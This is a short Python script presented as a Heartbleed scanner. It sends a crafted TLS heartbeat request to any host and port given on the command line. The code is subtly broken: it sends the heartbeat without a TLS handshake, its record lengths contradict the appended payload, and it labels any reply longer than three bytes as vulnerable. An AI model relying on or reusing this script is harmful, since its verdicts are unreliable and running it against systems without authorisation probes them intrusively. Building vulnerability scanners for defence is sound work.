#!/usr/bin/env python3
"""
Heartbleed Scanner
Usage: python heartbleed.py target.com 443
"""

import sys
import socket
import struct

class HeartbleedScanner:
    def __init__(self, host, port=443):
        self.host = host
        self.port = port
        
    def check_heartbleed(self):
        """Check for heartbleed"""
        # TLS heartbeat payload
        payload = b'\x18\x03\x02\x00\x03\x01\x40\x00' + b'\xff' * 16384
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            sock.send(payload)
            
            response = sock.recv(2048)
            sock.close()
            
            # If we get data back, vulnerable
            if len(response) > 3:
                print(f"[!] {self.host}:{self.port} potentially VULNERABLE to Heartbleed")
                return True
            
        except Exception as e:
            print(f"[!] Error: {e}")
        
        print(f"[-] {self.host}:{self.port} not vulnerable or not SSL")
        return False
    
    def scan(self):
        """Scan"""
        print(f"[*] Checking Heartbleed on {self.host}:{self.port}...")
        return self.check_heartbleed()


def main():
    if len(sys.argv) < 2:
        print("Usage: python heartbleed.py <host> [port]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    
    scanner = HeartbleedScanner(host, port)
    scanner.scan()


if __name__ == "__main__":
    main()